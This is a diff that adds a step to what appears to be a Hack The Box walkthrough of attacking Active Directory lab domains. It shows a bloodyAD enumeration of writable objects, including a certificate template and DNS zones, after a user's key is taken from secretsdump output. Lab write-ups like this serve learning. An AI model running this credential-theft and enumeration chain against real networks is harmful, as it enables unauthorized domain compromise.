@@ -1202,5 +1202,28 @@ SMB         dc2.pong.htb    445    dc2              [+] Run the following comman
 
 Ill use the secretdump output to get the aes key of `r.martinelli` to get a TGT
 
+```python
+❯❯❯ faketime -f +8h bloodyAD --host dc1.ping.htb -d pong.htb -k get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=ping,DC=htb
+permission: WRITE
+
+distinguishedName: CN=S-1-5-21-2410575906-3092493790-2123333151-1124,CN=ForeignSecurityPrincipals,DC=ping,DC=htb
+permission: WRITE
+
+distinguishedName: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
+permission: WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: DC=ping.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=ping,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.ping.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=ping,DC=htb
+permission: CREATE_CHILD
+```
+
+Now using that TGT in bloodyAD i can see the same thing
+
 
 
